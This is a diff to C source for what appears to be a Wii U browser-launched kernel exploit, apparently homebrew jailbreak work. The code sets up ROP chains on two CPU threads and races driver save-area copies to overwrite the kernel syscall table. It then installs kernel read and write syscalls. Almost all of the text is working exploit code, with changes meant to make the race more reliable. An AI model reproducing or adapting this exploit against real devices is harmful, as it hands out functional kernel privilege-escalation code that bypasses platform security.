@@ -3,22 +3,42 @@
 //comment out the line below for loadiine-style memory mapping
 //#define LOADIINE_MEM_MAP 1
 
+typedef struct
+{
+	char *drvb_name;
+	void *copy_payload;
+	void *thread0;
+	void *thread2;
+	uint32_t *rop0;
+	uint32_t *rop2;
+
+	void (*OSYieldThread)(void);
+	int32_t (*OSResumeThread)(void * thread);
+	uint32_t (*CopyToSaveArea)(char *driver_name, uint32_t name_length, void *buffer, uint32_t length);
+} thread_data_container_t;
+
 void wait(unsigned int t);
 void doBrowserShutdown(unsigned int coreinit_handle);
 void setupOSScreen(unsigned int coreinit_handle);
 void printOSScreenMsg(char *buf,unsigned int pos);
 void exitOSScreen(unsigned int coreinit_handle);
 void callSysExit(unsigned int coreinit_handle, void *sysFunc);
+void thread_callback(int argc, void *argv);
 
-/* Initial setup code stolen from Pong, makes race much more reliable */
 void _start()
 {
-	//Load a good stack
-	asm(
+	// Load a good stack before jumping into our C function
+	// and avoid GCC optimizations to use wrong stack pointer
+	asm volatile(
 		"lis %r1, 0x1ab5 ;"
 		"ori %r1, %r1, 0xd138 ;"
+		"bl _main ;"
 	);
+}
 
+/* Initial setup code stolen from Pong, makes race much more reliable */
+void _main()
+{
 	unsigned int coreinit_handle, sysapp_handle;
 	OSDynLoad_Acquire("coreinit", &coreinit_handle);
 	OSDynLoad_Acquire("sysapp", &sysapp_handle);
@@ -47,6 +67,10 @@ void _start()
 	/* OS thread functions */
 	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t stack, uint32_t stack_size, int32_t priority, uint16_t attr);
 	int32_t (*OSResumeThread)(void *thread);
+	int32_t (*OSGetThreadPriority)(void *thread);
+	void * (*OSGetCurrentThread)(void);
+	void (*OSYieldThread)(void);
+	int (*OSIsThreadTerminated)(void *thread);
 
 	/* Exit functions */
 	void (*__PPCExit)();
@@ -54,6 +78,8 @@ void _start()
 
 	int(*SYSSwitchToBrowser)(void *args);
 	int(*SYSLaunchSettings)(void *args);
+
+    void* (*MEMAllocFromDefaultHeapEx)(unsigned int size, unsigned int align);
 
 	/* Read the addresses of the functions */
 	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
@@ -64,12 +90,20 @@ void _start()
 	OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "ICInvalidateRange", &ICInvalidateRange);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
-	
+
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
 	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSGetThreadPriority", &OSGetThreadPriority);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSGetCurrentThread", &OSGetCurrentThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSYieldThread", &OSYieldThread);
+	OSDynLoad_FindExport(coreinit_handle, 0, "OSIsThreadTerminated", &OSIsThreadTerminated);
 
 	OSDynLoad_FindExport(coreinit_handle, 0, "__PPCExit", &__PPCExit);
 	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);
+
+	unsigned int *functionPointer = 0;
+	OSDynLoad_FindExport(coreinit_handle, 1, "MEMAllocFromDefaultHeapEx", &functionPointer);
+	MEMAllocFromDefaultHeapEx = (void*(*)(unsigned int, unsigned int))*functionPointer;
 
 	OSDynLoad_FindExport(sysapp_handle, 0, "SYSSwitchToBrowser", &SYSSwitchToBrowser);
 	OSDynLoad_FindExport(sysapp_handle, 0, "SYSLaunchSettings", &SYSLaunchSettings);
@@ -81,14 +115,16 @@ void _start()
 	}
 
 	/* Allocate a stack for the threads */
-	uint32_t stack0 = (uint32_t) OSAllocFromSystem(0x300, 0x20);
-	uint32_t stack2 = (uint32_t) OSAllocFromSystem(0x300, 0x20);
+	uint32_t stack0 = (uint32_t) MEMAllocFromDefaultHeapEx(0x300, 0x20);
+	uint32_t stack2 = (uint32_t) MEMAllocFromDefaultHeapEx(0x300, 0x20);
+	uint32_t stack1 = (uint32_t) MEMAllocFromDefaultHeapEx(0x300, 0x20);
 
 	/* Create the threads */
-	void *thread0 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
-	bool ret0 = OSCreateThread(thread0, _Exit, 0, NULL, stack0 + 0x300, 0x300, 0, 1);
-	void *thread2 = OSAllocFromSystem(OSTHREAD_SIZE, 8);
-	bool ret2 = OSCreateThread(thread2, _Exit, 0, NULL, stack2 + 0x300, 0x300, 0, 4);
+	void *thread0 = MEMAllocFromDefaultHeapEx(OSTHREAD_SIZE, 8);
+	bool ret0 = OSCreateThread(thread0, _Exit, 0, NULL, stack0 + 0x300, 0x300, 0, 1 | 0x10 | 8);
+	void *thread2 = MEMAllocFromDefaultHeapEx(OSTHREAD_SIZE, 8);
+	bool ret2 = OSCreateThread(thread2, _Exit, 0, NULL, stack2 + 0x300, 0x300, 0, 4 | 0x10 | 8);
+	void *thread1 = MEMAllocFromDefaultHeapEx(OSTHREAD_SIZE, 8);
 	if (ret0 == false || ret2 == false)
 	{
 		printOSScreenMsg("Failed to create threads! Please try again.",1);
@@ -128,7 +164,7 @@ void _start()
 	uint32_t *rop0 = (uint32_t*) stack0;
 	ctx0->gpr[1] = stack0 + 0x80;
 	ctx0->gpr[28] = 0;
-	ctx0->gpr[29] = CPU0_WAIT_TIME;
+	ctx0->gpr[29] = CPU0_WAIT_TIME * 2;
 	ctx0->gpr[31] = stack0 + 0x1f8;
 	ctx0->srr0 = sigwait_addr + 0xc;
 	rop0[0x94/4] = sleep_addr;
@@ -164,13 +200,13 @@ void _start()
 	rop0[0x224/4] = 0;
 	rop0[0x228/4] = (uint32_t)Register;
 	rop0[0x22c/4] = 0;
-	
+
 	/* Set up the ROP chain for CPU2 */
 	OSContext *ctx2 = (OSContext*) thread2;
 	uint32_t *rop2 = (uint32_t*) stack2;
 	ctx2->gpr[1] = stack2 + 0x80;
 	ctx2->gpr[28] = 0;
-	ctx2->gpr[29] = CPU2_WAIT_TIME;
+	ctx2->gpr[29] = CPU2_WAIT_TIME * 4;
 	ctx2->gpr[31] = stack2 + 0x1a8;
 	ctx2->srr0 = sigwait_addr + 0xc;
 	rop2[0x94/4] = sleep_addr;
@@ -197,9 +233,9 @@ void _start()
 	rop2[0x204/4] = 0xDEADC0DE;
 
 	/* Register driver A and driver B */
-	char *drva_name = OSAllocFromSystem(8, 4);
+	char *drva_name = MEMAllocFromDefaultHeapEx(8, 4);
 	memcpy(drva_name, "DRVA", 5);
-	char *drvb_name = OSAllocFromSystem(8, 4);
+	char *drvb_name = MEMAllocFromDefaultHeapEx(8, 4);
 	memcpy(drvb_name, "DRVB", 5);
 	uint32_t status = Register(drva_name, 4, NULL, NULL) | Register(drvb_name, 4, NULL, NULL);
 	if (status != 0)
@@ -211,7 +247,6 @@ void _start()
 	}
 
 	/* Generate the copy payload, which writes to syscall_table[0x34] */
-	uint32_t testval = 0xDEADBEEF;
 	uint32_t *copy_payload = OSAllocFromSystem(0x1000, 0x20);
 	if (!copy_payload)
 	{
@@ -224,37 +259,65 @@ void _start()
 	copy_payload[0xfb4/4] = 0x44525648;
 	copy_payload[0xfb8/4] = 0x41580000;
 	copy_payload[0xff4/4] = PFID_BROWSER;
-	copy_payload[0xff8/4] = /*&testval*/KERN_SYSCALL_TBL + (0x34 * 4);
+	copy_payload[0xff8/4] = KERN_SYSCALL_TBL + (0x34 * 4);
 	DCFlushRange(copy_payload, 0x1000);
 	DCInvalidateRange(copy_payload, 0x1000);
 
-	/* Schedule both threads for execution */
-	OSResumeThread(thread0);
-	OSResumeThread(thread2);
+	char *drvhax_name = MEMAllocFromDefaultHeapEx(8, 4);
+	drvhax_name[7] = 0;
+	memcpy(drvhax_name, "DRVHAX", 7);
+	uint32_t *syscalls = MEMAllocFromDefaultHeapEx(8, 4);
+	syscalls[0] = KERN_CODE_READ;
+	syscalls[1] = KERN_CODE_WRITE;
 
 	/* Do a dummy copy to put CopyToSaveArea() in our cache */
 	CopyToSaveArea(drvb_name, 4, (void*)0xC0000004, 4);
 
+	thread_data_container_t container;
+	container.drvb_name = drvb_name;
+	container.copy_payload = copy_payload;
+	container.rop0 = rop0;
+	container.rop2 = rop2;
+	container.thread0 = thread0;
+	container.thread2 = thread2;
+	container.OSResumeThread = OSResumeThread;
+	container.OSYieldThread = OSYieldThread;
+	container.CopyToSaveArea = CopyToSaveArea;
+
+	bool ret3 = OSCreateThread(thread1, thread_callback, 1, &container, stack1 + 0x300, 0x300, OSGetThreadPriority(OSGetCurrentThread()), 2 | 0x10 | 8);
+
+	OSYieldThread();
+	/* Schedule both threads for execution */
+	//OSResumeThread(thread0);
+	//OSResumeThread(thread2);
+	OSResumeThread(thread1);
+
+
 	/* Signal the CPU0 and CPU2 threads to begin */
-	rop2[0x1ac/4] = 0;
-	rop0[0x1fc/4] = 0;
+	//rop2[0x1ac/4] = 0;
+	//rop0[0x1fc/4] = 0;
 
 	/* Start copying the payload into driver B's save area */
-	CopyToSaveArea(drvb_name, 4, copy_payload, 0x1000);
+	//CopyToSaveArea(drvb_name, 4, copy_payload, 0x1000);
 
-	/* Wait for a while, which somehow helps things */
-	int i = 0, ctr = 0;
-	for (i = 0; i < 300000000; i++)
+	/* The amount of instructions in this loop and the sleep ticks of the other cores can decide whether its a success or not  */
+	while(OSIsThreadTerminated(thread1) == 0)
 	{
-		ctr++;
+		asm volatile (
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		"    nop\n"
+		);
+
+		OSYieldThread();
 	}
 
 	/* Use DRVHAX to install the read and write syscalls */
-	char *drvhax_name = OSAllocFromSystem(8, 4);
-	memcpy(drvhax_name, "DRVHAX", 7);
-	uint32_t *syscalls = OSAllocFromSystem(8, 4);
-	syscalls[0] = KERN_CODE_READ;
-	syscalls[1] = KERN_CODE_WRITE;
 	status = CopyToSaveArea(drvhax_name, 6, syscalls, 8);
 
 	/* Verify that the syscalls were installed */
@@ -314,7 +377,7 @@ void _start()
 	exitOSScreen(coreinit_handle);
 
 after_exploit: ;
-	/* Put stuff here that requires an exploited kernel, 
+	/* Put stuff here that requires an exploited kernel,
 	   and it will run the second time you launch this webpage */
 	printOSScreenMsg("Exploit already succeeded! Restarting browser...",1);
 	wait(0x1FFFFFFF);
@@ -322,9 +385,29 @@ after_exploit: ;
 	exitOSScreen(coreinit_handle);
 }
 
+void thread_callback(int argc, void *argv)
+{
+	thread_data_container_t *container = (thread_data_container_t*)argv;
+
+	container->OSYieldThread();
+
+	/* Schedule both threads for execution */
+	container->OSResumeThread(container->thread0);
+	container->OSResumeThread(container->thread2);
+
+	/* Signal the CPU0 and CPU2 threads to begin */
+	container->rop0[0x1fc/4] = 0;
+	container->rop2[0x1ac/4] = 0;
+
+	container->OSYieldThread();
+
+	container->CopyToSaveArea(container->drvb_name, 4,  container->copy_payload, 0x1000);
+}
+
 void wait(unsigned int t)
 {
-	while(t--) ;
+	while(t--)
+		asm volatile("nop; nop; nop; nop");
 }
 
 void doBrowserShutdown(unsigned int coreinit_handle)
@@ -350,7 +433,7 @@ void doBrowserShutdown(unsigned int coreinit_handle)
 	void *mem = OSAllocFromSystem(0x100, 64);
 	memset(mem, 0, 0x100);
 	//set restart flag to force quit browser
-	IM_SetDeviceState(fd, mem, 3, 0, 0); 
+	IM_SetDeviceState(fd, mem, 3, 0, 0);
 	IM_Close(fd);
 	OSFreeToSystem(mem);
 	//wait a bit for browser end
@@ -485,10 +568,10 @@ void *find_gadget(uint32_t code[], uint32_t length, uint32_t gadgets_start)
 }
 
 /* Read a 32-bit word with kernel permissions */
-uint32_t kern_read(const void *addr)
+uint32_t __attribute__ ((noinline)) kern_read(const void *addr)
 {
 	uint32_t result;
-	asm(
+	asm volatile (
 		"li 3,1\n"
 		"li 4,0\n"
 		"li 5,0\n"
@@ -512,9 +595,9 @@ uint32_t kern_read(const void *addr)
 }
 
 /* Write a 32-bit word with kernel permissions */
-void kern_write(void *addr, uint32_t value)
+void __attribute__ ((noinline)) kern_write(void *addr, uint32_t value)
 {
-	asm(
+	asm volatile (
 		"li 3,1\n"
 		"li 4,0\n"
 		"mr 5,%1\n"
